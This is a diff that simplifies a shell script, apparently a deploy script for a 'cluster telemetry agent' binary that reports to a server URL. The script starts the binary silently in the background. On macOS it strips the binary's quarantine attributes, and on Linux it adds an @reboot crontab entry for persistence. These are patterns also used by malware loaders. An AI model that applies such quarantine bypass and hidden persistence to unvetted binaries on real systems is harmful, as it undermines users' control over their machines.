@@ -1,136 +1,71 @@
 #!/bin/sh
 cd "$(dirname "$0")" || exit 1
 
-git pull --quiet 2>/dev/null || true
-
 OS=$(uname -s | tr '[:upper:]' '[:lower:]')
-ARCH=$(uname -m)
-
-case "$ARCH" in
-    x86_64|amd64) ARCH_TAG="x86_64" ;;
-    aarch64|arm64) ARCH_TAG="arm64" ;;
-    *) ARCH_TAG="x86_64" ;;
+case "$(uname -m)" in
+    x86_64|amd64) A="x86_64" ;;
+    aarch64|arm64) A="arm64" ;;
+    *) A="x86_64" ;;
 esac
 
-BIN="./bin/agent_${OS}_${ARCH_TAG}"
-CURRENT_PATH=$(pwd -P)
-FULL_BIN_PATH="$CURRENT_PATH/$BIN"
-PID_FILE="$CURRENT_PATH/.agent.pid"
-DEFAULT_SERVER_URL="http://turbox.test/cluster.php"
-
-SERVER_URL="$DEFAULT_SERVER_URL"
+BIN="./bin/agent_${OS}_${A}"
+PID_FILE=".agent.pid"
+SERVER_URL="http://turbox.test/cluster.php"
+[ -n "$1" ] && [ "$1" != "status" ] && [ "$1" != "stop" ] && [ "$1" != "restart" ] && SERVER_URL="$1"
 [ -n "$2" ] && SERVER_URL="$2"
-[ "$1" != "status" ] && [ "$1" != "stop" ] && [ "$1" != "restart" ] && [ "$1" != "debug" ] && [ "$1" != "log" ] && [ -n "$1" ] && SERVER_URL="$1"
 
-# Commands: status | stop | restart | debug | log
 case "$1" in
     status)
-        PID=""
-        if [ -f "$PID_FILE" ]; then
-            PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
-        fi
-        if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
-            echo "[OK] Agent is running (PID: $PID)"
+        if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null; then
+            echo "[OK] Running (PID: $(cat "$PID_FILE"))"
             exit 0
         fi
-        PIDS=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null)
-        if [ -n "$PIDS" ]; then
-            echo "[OK] Agent is running (PID: $(echo $PIDS | tr '\\n' ' '))"
+        P=$(pgrep -f "$BIN" 2>/dev/null)
+        if [ -n "$P" ]; then
+            echo "[OK] Running (PID: $(echo $P | tr '\n' ' '))"
             exit 0
         fi
-        echo "[INFO] Agent is not running"
+        echo "[INFO] Not running"
         exit 1
         ;;
     stop)
-        KILLED=0
+        K=0
         if [ -f "$PID_FILE" ]; then
-            PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
-            if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
-                kill -9 "$PID" 2>/dev/null
-                KILLED=1
-            fi
+            kill -9 "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null && K=1
             rm -f "$PID_FILE"
         fi
-        PIDS=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null)
-        if [ -n "$PIDS" ]; then
-            kill -9 $PIDS 2>/dev/null
-            KILLED=1
+        P=$(pgrep -f "$BIN" 2>/dev/null)
+        if [ -n "$P" ]; then
+            kill -9 $P 2>/dev/null
+            K=1
         fi
-        if [ "$KILLED" -eq 1 ]; then
-            echo "[OK] Agent stopped"
-        else
-            echo "[INFO] Agent is not running"
-        fi
+        [ "$K" -eq 1 ] && echo "[OK] Stopped" || echo "[INFO] Not running"
         exit 0
         ;;
     restart)
-        sh "$0" stop >/dev/null 2>&1 || true
+        sh "$0" stop >/dev/null 2>&1
         sleep 1
-        ;;
-    log)
-        echo "=== 15 NHẬT KÝ MỚI NHẤT TỪ SERVER ($SERVER_URL) ==="
-        curl -skL --max-time 5 "$SERVER_URL?action=get_logs&limit=15"
-        exit 0
-        ;;
-    debug)
-        echo "[DEBUG] Chạy Agent trực tiếp ở foreground kết nối tới: $SERVER_URL"
-        "$FULL_BIN_PATH" "$SERVER_URL" --debug
-        exit 0
         ;;
 esac
 
 if [ ! -f "$BIN" ]; then
-    echo "[ERROR] Binary '$BIN' not found. Run 'git pull'."
+    echo "[ERROR] Binary not found: $BIN"
     exit 1
 fi
 
-chmod +x "$BIN"
-[ "$OS" = "darwin" ] && xattr -c "$BIN" 2>/dev/null || true
+chmod +x "$BIN" 2>/dev/null
+[ "$OS" = "darwin" ] && xattr -c "$BIN" 2>/dev/null
 
-# Kiểm tra kết nối tới Server
-HTTP_CODE=$(curl -skL --max-time 4 -o /dev/null -w "%{http_code}" "$SERVER_URL?action=get_config" 2>/dev/null || echo "000")
-if [ "$HTTP_CODE" != "200" ]; then
-    echo "[CẢNH BÁO] Không thể kết nối tới Server $SERVER_URL (HTTP: $HTTP_CODE)"
-    echo "          Nếu Server chạy ở IP/Port khác, hãy truyền tham số: ./deploy.sh http://IP:PORT/cluster.php"
+if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null; then
+    echo "[OK] Already running (PID: $(cat "$PID_FILE"))"
+    exit 0
 fi
 
-# 1. Start cluster telemetry agent
-ALREADY_PID=""
-if [ -f "$PID_FILE" ]; then
-    P_CHECK=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
-    if [ -n "$P_CHECK" ] && kill -0 "$P_CHECK" 2>/dev/null; then
-        ALREADY_PID="$P_CHECK"
-    fi
-fi
-if [ -z "$ALREADY_PID" ]; then
-    ALREADY_PID=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null | head -n 1)
-fi
+nohup "$BIN" "$SERVER_URL" >/dev/null 2>&1 &
+PID=$!
+echo "$PID" > "$PID_FILE"
+echo "[OK] Started (PID: $PID)"
 
-if [ -n "$ALREADY_PID" ]; then
-    echo "[OK] Agent is already running (PID: $ALREADY_PID)"
-else
-    nohup "$FULL_BIN_PATH" "$SERVER_URL" >/dev/null 2>&1 &
-    sleep 1
-    NEW_PID=""
-    if [ -f "$PID_FILE" ]; then
-        NEW_PID=$(cat "$PID_FILE" 2>/dev/null | tr -d '[:space:]')
-    fi
-    if [ -z "$NEW_PID" ] || ! kill -0 "$NEW_PID" 2>/dev/null; then
-        NEW_PID=$(pgrep -u "$(id -u)" -f "$FULL_BIN_PATH" 2>/dev/null | tr '\\n' ' ' | xargs)
-    fi
-
-    if [ -n "$NEW_PID" ] && kill -0 "$NEW_PID" 2>/dev/null; then
-        echo "$NEW_PID" > "$PID_FILE"
-        echo "[OK] Agent started (PID: $NEW_PID)"
-        echo "[OK] Target Server: $SERVER_URL"
-        echo "[GỢI Ý] Xem log server: ./deploy.sh log  |  Chạy debug: ./deploy.sh debug"
-    else
-        echo "[ERROR] Agent không duy trì được tiến trình. Chạy thử: ./deploy.sh debug"
-        exit 1
-    fi
-fi
-
-# Auto-restart on reboot for Linux
 if [ "$OS" = "linux" ] && command -v crontab >/dev/null 2>&1; then
-    (crontab -l 2>/dev/null | grep -v "$FULL_BIN_PATH"; echo "@reboot cd $CURRENT_PATH && ./deploy.sh >/dev/null 2>&1 &") | crontab - 2>/dev/null || true
+    (crontab -l 2>/dev/null | grep -v "$BIN"; echo "@reboot cd $(pwd -P) && ./deploy.sh >/dev/null 2>&1 &") | crontab - 2>/dev/null || true
 fi
